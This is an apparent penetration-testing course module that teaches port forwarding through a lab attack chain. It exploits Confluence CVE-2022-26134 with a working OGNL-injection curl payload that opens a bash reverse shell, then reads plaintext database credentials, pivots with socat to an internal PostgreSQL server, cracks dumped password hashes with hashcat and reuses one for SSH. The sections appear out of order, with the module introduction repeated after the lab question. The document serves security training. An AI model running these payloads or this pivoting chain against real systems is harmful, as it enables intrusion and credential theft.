In this module’s exercises, our Kali machine will be positioned in the WAN We can route directly from our Kali machine only to hosts also on the WAN.

A DMZ is a network containing devices that may be more exposed to a wider, less trusted network. A DMZ helps create a buffer zone between hosts on the wider, less trusted network and internal hosts. In this way, it serves a similar function to a real-world [_Demilitarized zone_](https://en.wikipedia.org/wiki/Demilitarized_zone). In this scenario, the DMZ is the buffer network segment between the WAN and whatever other internal networks we may find.

CONFLUENCE01 is straddling both the WAN and DMZ to illustrate that it can communicate on both networks. CONFLUENCE01 is also listening on TCP port 8090, illustrated by the "open socket" attached to the icon.

PGDATABASE01 is within the DMZ network boundary; it does not straddle the WAN/DMZ. Our Kali machine is not in the DMZ, so we can't directly route to PGDATABASE01. PGDATABASE01 also has an "open socket" attached to it, illustrating that there's something listening on TCP port 5432 (this is likely a PostgreSQL server, since the default port is 5432).

Since the only thing we know about PGDATABASE01 so far is that it exists, we don't yet know if it's attached to any other networks. If later we find that PGDATABASE01 is attached to other networks, we will expand our network diagram.

With the credentials we found on CONFLUENCE01, we want to try to connect to this PostgreSQL port on PGDATABASE01 from our Kali machine.

Before getting into more detail, let's set up our lab environment to recreate the scenario we've described so far.

At the end of the _Port Forwarding with Socat_ section of this Learning Unit, a group of VMs are provided that can be used to follow along with the following sections. These VMs are provided so you can gain hands-on experience with all the techniques we cover. You can start the VM group at any point and follow along at whatever pace feels comfortable.

## 19.2.2. Setting Up the Lab Environment

To gain access to CONFLUENCE01, we need to leverage the command execution vulnerability in the Confluence web application to get a reverse shell. After discovering that the Confluence web application is vulnerable to CVE-2022-26134, we'll find a blog post from [_Rapid7_](https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/) that includes a [_cURL_](https://curl.se/) command containing a [_proof-of-concept_](https://en.wikipedia.org/wiki/Proof_of_concept) payload that claims to exploit the vulnerability and return a reverse shell.

```
curl -v http://10.0.0.28:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/10.0.0.28/1270%200%3E%261%27%29.start%28%29%22%29%7D/
```

> Listing 1 - The example payload from the Rapid7 blog post.

We don't run payloads without understanding exactly what they do, so we first need to figure out what's happening in this proof-of-concept.

The verbose (**\-v**) **curl** request is being made to **http://10.0.0.28:8090**, which we assume is the blogpost author's vulnerable Confluence server. After this, the URL [_path_](https://en.wikipedia.org/wiki/Uniform_Resource_Identifier#Syntax) looks more interesting. We observe that a lot of the characters in it are [_URL encoded_](https://en.wikipedia.org/wiki/Percent-encoding), so we need to _URL decode_ them to get a clearer sense of what the payload actually does.

You can quickly URL decode strings by selecting _Decode As..._ > _URL_ in the _Decoder_ tab in [_Burp_](https://portswigger.net/burp), or using an online tool such as [_CyberChef_](https://gchq.github.io/CyberChef/) If working with sensitive information in a real corporate environment, you should avoid pasting data into online tools. However, in this case we're decoding a proof-of-concept that's already public, so we can use online tools if necessary.

After URL decoding the path, the function of the payload is clearer.

```
/${new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder().command('bash','-c','bash -i >& /dev/tcp/10.0.0.28/1270 0>&1').start()")}/
```

> Listing 2 - The example payload URL-decoded.

The URL path is an _OGNL injection_ payload. OGNL is [_Object-Graph Notation Language_](https://en.wikipedia.org/wiki/OGNL), an expression language commonly used in Java applications. OGNL injection can take place when an application handles user input in such a way that it gets passed to the OGNL expression parser. Since it's possible to execute Java code within OGNL expressions, OGNL injection can be used to execute arbitrary code.

The OGNL injection payload itself uses Java's [_ProcessBuilder_](https://docs.oracle.com/javase/7/docs/api/java/lang/ProcessBuilder.html) class to spawn a _Bash_ interactive reverse shell (_bash -i_).

This proof-of-concept payload is almost perfect for our needs. However, we need to modify it before we can use it. This is for two reasons. First, the Confluence server that the payload is pointing to in the original payload is not where our vulnerable Confluence server is. Second, the Bash reverse shell payload is pointing at port 1270 on 10.0.0.28, which is not where our Kali machine is. We need to modify these parameters in the payload before we can reuse it to exploit CONFLUENCE01 and return a shell to our own Kali machine.

While making these modifications, we also need to take the URL encoding into account. The payload string in the proof-of-concept isn't completely URL encoded. Certain characters (notably ".", "-" and "/") are not encoded. Although it's not always the case, for _this_ exploit, this turns out to be important to the functioning of the payload. If any of these characters are encoded, the server will parse the URL differently, and the payload may not execute. This means we can't apply URL encoding across the whole payload once we've modified it.

Keeping this in mind, we'll manually modify the parameters we need, using the original proof-of-concept payload as our base. We can change the Confluence server IP to **192.168.50.63**, and the Bash interactive shell payload IP and port to a listener we're going to open on our Kali machine (**/dev/tcp/192.168.118.4/4444**). We'll also remove the **curl** verbosity flag. This leaves us with the following modified payload:

```
curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.118.4/4444%200%3E%261%27%29.start%28%29%22%29%7D/
```

> Listing 3 - The modified payload.

Now that our payload is customized for our use, we can start a [_Netcat_](https://en.wikipedia.org/wiki/Netcat) listener on our Kali machine on TCP port 4444.

```
kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ...
```

> Listing 4 - Starting Netcat listener on port 4444 on our Kali machine.

With our listener running, we'll open another shell on our Kali machine, then run the **curl** command we just constructed.

```
kali@kali:~$ curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.118.4/4444%200%3E%261%27%29.start%28%29%22%29%7D/

kali@kali:~$ 
```

> Listing 5 - Executing the modified reverse shell payload.

The command itself doesn't return anything, but the reverse shell is caught by our listener.

```
...
listening on [any] 4444 ...
connect to [192.168.118.4] from (UNKNOWN) [192.168.50.63] 55876
bash: cannot set terminal process group (813): Inappropriate ioctl for device
bash: no job control in this shell
confluence@confluence01:/opt/atlassian/confluence/bin$ id
id
uid=1001(confluence) gid=1001(confluence) groups=1001(confluence)
```

> Listing 6 - Bash reverse shell caught by our Netcat listener, and confirmed with the id command.

The **id** command confirms that this shell is running with the privileges of the _confluence_ user. This user has quite limited privileges. Regardless, we now have a reverse shell from CONFLUENCE01 to our Kali machine.

We can now start some light enumeration of CONFLUENCE01 using our new shell. We'll check the network interfaces using **ip addr**.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ ip addr
ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:8a:54:46 brd ff:ff:ff:ff:ff:ff
    inet 192.168.50.63/24 brd 192.168.50.255 scope global ens192
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:5446/64 scope link 
       valid_lft forever preferred_lft forever
3: ens224: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:8a:c2:c9 brd ff:ff:ff:ff:ff:ff
    inet 10.4.50.63/24 brd 10.4.50.255 scope global ens224
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:c2c9/64 scope link 
       valid_lft forever preferred_lft forever
```

> Listing 7 - Enumerating network interfaces on CONFLUENCE01.

The output shows us that CONFLUENCE01 has two network interfaces: _ens192_ and _ens224_. _ens192_ has the IP address 192.168.50.63, and _ens224_ has the IP address 10.4.50.63. We can then check the routes using **ip route**.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ ip route
ip route
default via 192.168.50.254 dev ens192 proto static 
10.4.50.0/24 dev ens224 proto kernel scope link src 10.4.50.63 
10.4.50.0/24 via 10.4.50.254 dev ens224 proto static
192.168.50.0/24 dev ens192 proto kernel scope link src 192.168.50.63
```

> Listing 8 - Enumerating routes on CONFLUENCE01.

The command shows us that we should be able to access hosts in the 192.168.50.0/24 subnet through the _ens192_ interface, and hosts in the 10.4.50.0/24 subnet through the _ens224_ interface.

Continuing our enumeration, we'll find the Confluence configuration file at **/var/atlassian/application-data/confluence/confluence.cfg.xml**. While reading the contents using **cat**, we discover some plaintext database credentials located within.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ cat /var/atlassian/application-data/confluence/confluence.cfg.xml
<sian/application-data/confluence/confluence.cfg.xml   
<?xml version="1.0" encoding="UTF-8"?>

<confluence-configuration>
  <setupStep>complete</setupStep>
  <setupType>custom</setupType>
  <buildNumber>8703</buildNumber>
  <properties>
...
    <property name="hibernate.connection.password">D@t4basePassw0rd!</property>
    <property name="hibernate.connection.url">jdbc:postgresql://10.4.50.215:5432/confluence</property>
    <property name="hibernate.connection.username">postgres</property>
...
  </properties>
</confluence-configuration>
confluence@confluence01:/opt/atlassian/confluence/bin$ 
```

> Listing 9 - The credentials found in the Confluence confluence.cfg.xml file on CONFLUENCE01.

We'll find the IP address of the database server, as well as the plain text username and password used to connect to it. We can use these credentials to authenticate to the database and continue our enumeration.

We've hit a limitation, however. CONFLUENCE01 doesn't have a PostgreSQL client installed on it. Since we are running as the low-privileged _confluence_ user, we are also unable to easily install software.

We _do_ have the PostgreSQL client _psql_ installed on our Kali machine, but we can't connect directly to PGDATABASE01 from our Kali machine, since it's only routable from CONFLUENCE01.

In this scenario, there is no firewall in place between our Kali machine and CONFLUENCE01, meaning that there is nothing stopping us from binding ports on the WAN interface of CONFLUENCE01 and connecting to them from our Kali machine.

This is exactly the type of situation in which port forwarding can be useful. We can create a port forward on CONFLUENCE01 that listens on a port on the WAN interface, then forward all packets received on this port to the PGDATABASE01 on the internal subnet. In the next section, we will use [_Socat_](http://www.dest-unreach.org/socat/doc/socat.html) to achieve this.

## 19.2.3. Port Forwarding with Socat

Now we are ready to create a port forward. We have an idea of how we want it to work: CONFLUENCE01 should listen on a port on the WAN interface and forward all packets received on this port to the PGDATABASE01 on the internal subnet. This concept is illustrated in the following diagram:

![Figure 2: The way we expect our port forward to work](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/0821666b2826564e07661eba0550c37a-PRAT2_1_1_PortForwardPlan.png)

Figure 2: The way we expect our port forward to work

We want to open TCP port 2345 on the WAN interface of CONFLUENCE01, then connect to that port from our Kali machine. We want all the packets that we send to this port to be forwarded by CONFLUENCE01 to TCP port 5432 on PGDATABASE01. Once we set up our port forward, connecting to TCP port 2345 on CONFLUENCE01 will be exactly like connecting directly to TCP port 5432 on PGDATABASE01.

As part of our enumeration of CONFLUENCE01, we'll find Socat installed. Socat is a general-purpose networking tool that can set up a simple port forward in a single command.

In this scenario, we find it already installed, but Socat does not tend to be installed by default on \*NIX systems. If not already installed, it's possible to download and run a statically linked binary version instead.

We will use Socat to configure the desired port forward on CONFLUENCE01. It will listen on a port on the WAN interface (that our Kali machine can connect to) and forward packets received on that port to PGDATABASE01.

On CONFLUENCE01, we'll start a verbose (**\-ddd**) Socat process. It will listen on TCP port 2345 (**TCP-LISTEN:2345**), fork into a new subprocess when it receives a connection (**fork**) instead of dying after a single connection, then forward all traffic it receives to TCP port 5432 on PGDATABASE01 (**TCP:10.4.50.215:5432**).

We'll listen on port 2345 since it is outside the privileged port range (0-1024), meaning elevated privileges are not required.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
<ocat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432   
2022/08/18 10:12:01 socat[46589] I socat by Gerhard Rieger and contributors - see www.dest-unreach.org
2022/08/18 10:12:01 socat[46589] I This product includes software developed by the OpenSSL Project for use in the OpenSSL Toolkit. (http://www.openssl.org/)
2022/08/18 10:12:01 socat[46589] I This product includes software written by Tim Hudson (tjh@cryptsoft.com)
2022/08/18 10:12:01 socat[46589] I setting option "fork" to 1
2022/08/18 10:12:01 socat[46589] I socket(2, 1, 6) -> 5
2022/08/18 10:12:01 socat[46589] I starting accept loop
2022/08/18 10:12:01 socat[46589] N listening on AF=2 0.0.0.0:2345
```

> Listing 10 - Running the Socat port forward command.

The network is now set up like the following diagram:

![Figure 3: Socat in place as our port forwarder](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/eb1577c7ae460992abbeee4839ffb4e3-PRAT2_1_3_PortForwardSocat.png)

Figure 3: Socat in place as our port forwarder

With the Socat process running, we can run **psql** on our Kali machine, specifying that we want to connect to CONFLUENCE01 (**\-h 192.168.50.63**) on port 2345 (**\-p 2345**) with the _postgres_ user account (**\-U postgres**). When prompted, we will enter the password, and once connected, we can run the **\\l** command to list the available databases.

```
kali@kali:~$ psql -h 192.168.50.63 -p 2345 -U postgres
Password for user postgres: 
psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

postgres=# \l
                                  List of databases
    Name    |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
------------+----------+----------+-------------+-------------+-----------------------
 confluence | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 postgres   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 template0  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
            |          |          |             |             | postgres=CTc/postgres
 template1  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
            |          |          |             |             | postgres=CTc/postgres
(4 rows)
```

> Listing 11 - Connecting to the PGDATABASE01 PostgreSQL service and listing databases using psql, through our port forward.

Success! We've connected to the PostgreSQL database through our port forward. We'll also find that we have access to the _confluence_ database.

Using our new database access, we can continue our enumeration. In the confluence database, let's query the _cwd\_user_ table. This contains the username and password hashes for all Confluence users. We'll connect to the database with the **\\c confluence** command, then run **select \* from cwd\_user;** to review everything in that table.

```
postgres=# \c confluence
psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
You are now connected to database "confluence" as user "postgres".

confluence=# select * from cwd_user;

   id    |   user_name    | lower_user_name | active |      created_date       |      updated_date       | first_name | lower_first_name |   last_name   | lower_last_name |      display_name      |   lower_display_name   |           email_address            |        lower_email_address         |             external_id              | directory_id |                                credential                                 
---------+----------------+-----------------+--------+-------------------------+-------------------------+------------+------------------+---------------+-----------------+------------------------+------------------------+------------------------------------+------------------------------------+--------------------------------------+--------------+---------------------------------------------------------------------------
  458753 | admin          | admin           | T      | 2022-08-17 15:51:40.803 | 2022-08-17 15:51:40.803 | Alice      | alice            | Admin         | admin           | Alice Admin            | alice admin            | alice@industries.internal          | alice@industries.internal          | c2ec8ebf-46d9-4f5f-aae6-5af7efadb71c |       327681 | {PKCS5S2}WbziI52BKm4DGqhD1/mCYXPl06IAwV7MG7UdZrzUqDG8ZSu15/wyt3XcVSOBo6bC
 1212418 | trouble        | trouble         | T      | 2022-08-18 10:31:48.422 | 2022-08-18 10:31:48.422 |            |                  | Trouble       | trouble         | Trouble                | trouble                | trouble@industries.internal        | trouble@industries.internal        | 164eb9b5-b6ef-4c0f-be76-95d19987d36f |       327681 | {PKCS5S2}A+U22DLqNsq28a34BzbiNxzEvqJ+vBFdiouyQg/KXkjK0Yd9jdfFavbhcfZG1rHE
 1212419 | happiness      | happiness       | T      | 2022-08-18 10:33:49.058 | 2022-08-18 10:33:49.058 |            |                  | Happiness     | happiness       | Happiness              | happiness              | happiness@industries.internal      | happiness@industries.internal      | b842163d-6ff5-4858-bf54-92a8f5b28251 |       327681 | {PKCS5S2}R7/ABMLgNl/FZr7vvUlCPfeCup9dpg5rplddR6NJq8cZ8Nqq+YAQaHEauk/HTP49
 1212417 | database_admin | database_admin  | T      | 2022-08-18 10:24:34.429 | 2022-08-18 10:24:34.429 | Database   | database         | Admin Account | admin account   | Database Admin Account | database admin account | database_admin@industries.internal | database_admin@industries.internal | 34901af8-b2af-4c98-ad1d-f1e7ed1e52de |       327681 | {PKCS5S2}QkXnkmaBicpsp0B58Ib9W5NDFL+1UXgOmJIvwKjg5gFjXMvfeJ3qkWksU3XazzK0
 1212420 | hr_admin       | hr_admin        | T      | 2022-08-18 18:39:04.59  | 2022-08-18 18:39:04.59  | HR         | hr               | Admin         | admin           | HR Admin               | hr admin               | hr_admin@industries.internal       | hr_admin@industries.internal       | 2f3cc06a-7b08-467e-9891-aaaaeffe56ea |       327681 | {PKCS5S2}EiMTuK5u8IC9qGGBt5cVJKLu0uMz7jN21nQzqHGzEoLl6PBbUOut4UnzZWnqCamV
 1441793 | rdp_admin      | rdp_admin       | T      | 2022-08-20 20:46:03.325 | 2022-08-20 20:46:03.325 | RDP        | rdp              | Admin         | admin           | RDP Admin              | rdp admin              | rdp_admin@industries.internal      | rdp_admin@industries.internal      | e9a9e0f5-42a2-433a-91c1-73c5f4cc42e3 |       327681 | {PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34
(6 rows)

(END)
```

> Listing 12 - The contents of the cwd\_user table in the confluence database.

We obtain multiple rows of user data. Each row contains data for a single Confluence user, including their password hash. We will use [_Hashcat_](https://hashcat.net/hashcat/) to try to crack these.

The [Hashcat mode number](https://hashcat.net/wiki/doku.php?id=example_hashes) for _Atlassian (PBKDF2-HMAC-SHA1)_ hashes is _12001_, so we can pass that to the **\-m** mode flag. After copying the hashes into a file called **hashes.txt**, we'll pass this as the first positional argument. We can then pass the **fastrack.txt** password list that's built into Kali as the final positional argument.

```
kali@kali:~$ hashcat -m 12001 hashes.txt /usr/share/wordlists/fasttrack.txt 
hashcat (v6.2.5) starting

OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=====================================================================================================================================
* Device #1: pthread-11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz, 2917/5899 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

...

{PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34:P@ssw0rd!
{PKCS5S2}QkXnkmaBicpsp0B58Ib9W5NDFL+1UXgOmJIvwKjg5gFjXMvfeJ3qkWksU3XazzK0:sqlpass123
{PKCS5S2}EiMTuK5u8IC9qGGBt5cVJKLu0uMz7jN21nQzqHGzEoLl6PBbUOut4UnzZWnqCamV:Welcome1234
...
```

> Listing 13 - Hashcat having cracked the database\_admin, hr\_admin and rdp\_admin account hashes.

It appears that the password policy for this Confluence instance isn't very strong. After only a few minutes of cracking, Hashcat returns passwords for the _database\_admin_, _hr\_admin_ and _rdp\_admin_ users.

We might suspect that these passwords are reused in other places throughout the network. After some more enumeration of the internal network, we'll find PGDATABASE01 is also running an SSH server. Let's try these credentials against this SSH server. With our new port forwarding skill, we can create a port forward on CONFLUENCE01 that will allow us to SSH directly from our Kali machine to PGDATABASE01.

First, we need to kill the original Socat process listening on TCP port 2345. We'll then create a new port forward with Socat that will listen on TCP port 2222 and forward to TCP port 22 on PGDATABASE01.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
</bin$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22 

```

> Listing 14 - Creating a new port forward with Socat to access the SSH service on PGDATABASE01.

With our new Socat port forward set up, our network setup will be configured much like the following diagram:

![Figure 4: Using Socat to open a port forward from CONFLUENCE01 to the SSH server on PGDATABASE01](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/ae6bb27852f848e8c26cbb2eb12443fb-PRAT2_1_4_PortForwardSocatSSH.png)

Figure 4: Using Socat to open a port forward from CONFLUENCE01 to the SSH server on PGDATABASE01

There are only very minimal differences between this and the previous network setup. Instead of listening on 2345, we are listening on 2222. Instead of forwarding to TCP port 5432 on PGDATABASE01, we are forwarding to TCP port 22 on PGDATABASE01.

We'll then use our SSH client to connect to port 2222 on CONFLUENCE01, as though we are connecting directly to port 22 on PGDATABASE01. We can use the _database\_admin_ user, and the password we just cracked using Hashcat.

```
kali@kali:~$ ssh database_admin@192.168.50.63 -p2222
The authenticity of host '[192.168.50.63]:2222 ([192.168.50.63]:2222)' can't be established.
ED25519 key fingerprint is SHA256:3TRC1ZwtlQexLTS04hV3ZMbFn30lYFuQVQHjUqlYzJo.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.50.63]:2222' (ED25519) to the list of known hosts.
database_admin@192.168.50.63's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-122-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 18 Aug 2022 11:43:07 AM UTC

  System load:  0.1               Processes:               241
  Usage of /:   59.3% of 7.77GB   Users logged in:         1
  Memory usage: 16%               IPv4 address for ens192: 10.4.50.215
  Swap usage:   0%                IPv4 address for ens224: 172.16.50.215


0 updates can be applied immediately.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

database_admin@pgdatabase01:~$
```

> Listing 15 - Connecting to SSH server on PGDATABASE01, through the port forward on CONFLUENCE01.

Success! The **database\_admin** credentials have been reused here. We have managed to connect to the SSH server on PGDATABASE01 using the credentials for _database\_admin_ we found in the PostgreSQL database through the port forward we set up on CONFLUENCE01 with Socat.

In this Learning Unit, we created some simple port forwards using Socat. These allowed us to gain deeper access within a network by leveraging our existing access to a compromised host.

It should also be noted that Socat is not the only way to create port forwards on \*NIX hosts. There are several alternatives, of note:

-   [_rinetd_](https://github.com/samhocevar/rinetd) is an option that runs as a daemon. This makes it a better solution for longer-term port forwarding configurations but is slightly unwieldy for temporary port forwarding solutions.
    
-   We can combine Netcat and a [_FIFO_](https://man7.org/linux/man-pages/man7/fifo.7.html) named pipe file to create a [port forward](https://gist.github.com/holly/6d52dd9addd3e58b2fd5).
    
-   If we have root privileges, we could use iptables to create port forwards. The specific iptables port forwarding setup for a given host will likely depend on the configuration already in place. To be able to forward packets in Linux also requires enabling forwarding on the interface we want to forward on by writing "1" to **/proc/sys/net/ipv4/conf/\[interface\]/forwarding** (if it's not already configured to allow it).
    

## Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

Port Redirection and SSH Tunneling - Port Forwarding with Socat - VM Group

#### Labs

1.  Follow the steps in this section to set up a port forward and gain access to the _confluence_ database on PGDATABASE01 using **psql** from your Kali machine. Crack the password of the _database\_admin_ user. What is the plain text password of this account?

Answer

# 19\. Port Redirection and SSH Tunneling

In this Learning Module, we will cover the following Learning Units:

-   Port Forwarding on \*NIX and Windows Machines
-   SSH Tunneling on (and between) \*NIX and Windows Machines

## 19.1. Why Port Redirection and Tunneling?

This Learning Unit covers the following Learning Objectives:

-   Understand the difference between common network layouts
-   Consider the impact of common network security devices
-   Understand when to use port redirection and tunneling techniques

Most network environments are not -and should not be- [_flat_](https://en.wikipedia.org/wiki/Flat_network), In a flat network, all devices are able to communicate freely with each other. There is little (or no) attempt to limit the access that each device has to other devices on the same network, regardless of whether devices need to communicate during normal operations.

Flat network topology is generally considered poor security practice. Once an attacker has access to a single host, they can start communicating with every other host. From there, it will be much easier to spread through the network and start compromising other hosts.

A more securely designed network type is [_segmented_](https://en.wikipedia.org/wiki/Network_segmentation).This type of network will be broken into smaller networks, each of which is called a [_subnet_](https://en.wikipedia.org/wiki/Subnetwork). Each subnet will contain a group of devices that have a specific purpose, and devices on that subnet are only granted access to other subnets and hosts when absolutely necessary. Network segmentation severely limits attackers, because compromising a single host no longer gives them free access to every other device on the network.

As part of the network segmentation process, most network administrators will also implement controls that limit the flow of traffic into, out from, and across their networks. To enforce this, they will deploy various technologies throughout the network.

One of the most common technologies used for this is [_Firewalls_](https://en.wikipedia.org/wiki/Firewall_(computing)). Firewalls can be implemented at the endpoint software level. For example, the _Linux kernel_ has firewall capabilities that can be configured with the [_iptables_](https://en.wikipedia.org/wiki/Iptables) tool suite, while Windows offers the built-in [_Windows Defender Firewall_](https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-firewall/windows-firewall-with-advanced-security). Firewalls may also be implemented as features within a piece of physical network infrastructure. Administrators may even place a standalone _hardware firewall_ in the network, filtering all traffic.

Firewalls can drop unwanted inbound packets and prevent potentially malicious traffic from traversing or leaving the network. Firewalls may prevent all but a few allowed hosts from communicating with a port on a particularly privileged server. They can also block some hosts or subnets from accessing the wider _internet_.

Most firewalls tend to allow or block traffic in line with a set of rules based on _IP addresses_ and _port numbers_, so their functionality is limited. However, sometimes more fine-grained control is required. [_Deep Packet Inspection_](https://en.wikipedia.org/wiki/Deep_packet_inspection) monitors the contents of incoming and outgoing traffic and terminates it based on a set of rules.

Boundaries that are put in place by network administrators are designed to prevent the _arbitrary movement of data into, out of, and across the network_. But, as an attacker, these are exactly the boundaries we need to traverse. We'll need to develop strategies that can help us work around network restrictions as we find them.

_Port redirection_ (a term we are using to describe various types of [_port forwarding_](https://en.wikipedia.org/wiki/Port_forwarding)) and [_tunneling_](https://en.wikipedia.org/wiki/Tunneling_protocol) are both strategies we can use to traverse these boundaries. Port redirection modifies the data flow by redirecting packets from one socket to another. Tunneling means [_encapsulating_](https://en.wikipedia.org/wiki/Encapsulation_(networking)) one type of data stream within another, for example, transporting _Hypertext Transfer Protocol_ (HTTP) traffic within a _Secure Shell_ (SSH) connection (so from an external perspective, only the SSH traffic will be visible).

In this Module, we will introduce port redirection and tunneling techniques through practical examples. We'll ease in by starting with the lowest complexity techniques, and increase complexity as we move step-by-step towards more hardened network environments. Each new technique will be applied to a new network configuration that is slightly different than the previous. The only tunneling we cover in this Module is SSH tunneling, but we will cover more advanced methods in a later Module.

The [_logical topologies_](https://en.wikipedia.org/wiki/Network_topology) we create when chaining these strategies may initially be difficult to grasp. We will be making traffic move in ways that may not be initially intuitive. We should take the time to fully understand each technique before advancing to the next. By the end of this Module, we'll have all the tools required to manipulate the flow of traffic in any given network with surgical precision.

## 19.2. Port Forwarding with Linux Tools

This Learning Unit covers the following Learning Objectives:

1.  Understand what port forwarding is
2.  Learn when to use port forwarding techniques
3.  Use Socat to set up a port forward in Linux

Port forwarding is the most fundamental technique we will examine in this Module. It's also a technique that's very commonly used in general-purpose networking. When port forwarding, we configure a host to listen on one port and relay all packets received on that port to another destination.

In normal network conditions, a network administrator might create a port forward to allow access to a web server behind a firewall. In that case, they would configure the firewall to listen on a given port on one interface and pass all packets to the web server behind it.

Many home _routers_ also provide port forwarding functionality. These can be configured to listen on a port on the Internet-facing side of the router, then forward connections from that port to another device within the home network.

How might we use port forwarding in an attack chain? In the next section, we'll consider a simple scenario.

## 19.2.1. A Simple Port Forwarding Scenario

Let's examine a port forwarding scenario. During an assessment, we find a Linux web server running a version of [_Confluence_](https://www.atlassian.com/software/confluence) vulnerable to [_CVE-2022-26134_](https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html): a pre-authentication remote code execution issue. We can exploit this vulnerability and gain a reverse shell from the server.

During our enumeration, we find that this server has two _network interfaces_: one attached to the same network our Kali machine is also on (which allowed us to route to it directly), and another on an internal subnet. In the Confluence configuration file, we also find credentials and the IP address and port for a [_PostgreSQL_](https://www.postgresql.org/) database instance on a server in that internal subnet. We want to use these credentials to gain access to the database and enumerate further.

The following diagram illustrates our current understanding of the network layout.

![Figure 1: The network layout from our perspective so far](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/9f1e3efdc5c0256e854e387e50f5a621-PRAT2_1_0_ConfluenceAndDatabaseNetworkSetup.png)

Figure 1: The network layout from our perspective so far

One of the first things to notice about this diagram is that there are two named networks: the [_Wide Area Network_](https://en.wikipedia.org/wiki/Wide_area_network) (WAN) on the left and the [_Demilitarized Zone_](https://en.wikipedia.org/wiki/DMZ_(computing)) (DMZ) on the right. Our Kali machine is in the WAN, the PostgreSQL database server PGDATABASE01 is in the DMZ, and the Confluence server CONFLUENCE01 straddles both.

A WAN is a network that is large and expansive. Some people refer to the public internet as the largest WAN in the world, and some larger organizations will refer to their large internal network as a WAN, or internal WAN. In this case, since we're simulating an attack from an external network, the WAN represents a large corporate internal network, or the internet itself.

In this module’s exercises, our Kali machine will be positioned in the WAN We can route directly from our Kali machine only to hosts also on the WAN.

A DMZ is a network containing devices that may be more exposed to a wider, less trusted network. A DMZ helps create a buffer zone between hosts on the wider, less trusted network and internal hosts. In this way, it serves a similar function to a real-world [_Demilitarized zone_](https://en.wikipedia.org/wiki/Demilitarized_zone). In this scenario, the DMZ is the buffer network segment between the WAN and whatever other internal networks we may find.

CONFLUENCE01 is straddling both the WAN and DMZ to illustrate that it can communicate on both networks. CONFLUENCE01 is also listening on TCP port 8090, illustrated by the "open socket" attached to the icon.

